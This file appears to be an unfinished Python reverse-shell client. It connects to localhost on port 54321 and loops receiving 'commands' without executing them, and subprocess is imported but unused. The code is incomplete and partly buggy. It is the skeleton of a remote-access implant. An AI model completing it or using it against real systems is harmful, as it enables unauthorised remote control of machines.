#!/usr/bin/python
import socket
import subprocess
import json
import os
import base64

IP_CONNECT = "127.0.0.1"

def reliable_send(data):
	json_data = data
	print(json_data)
	sock.sendall(json_data)

def reliable_recv():
	data=""
	while True:
		try:
			data = data + sock.recv(1024).decode()
			print(data)
			#return json.loads(data)
			return data
		except ValueError as e:
			print("caught")
			print(e)
			return "error" 


def shell():
	while True:
		print("Listening")
		command = reliable_recv()
		#print(command)
		

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((IP_CONNECT,54321))

shell()
sock.close()

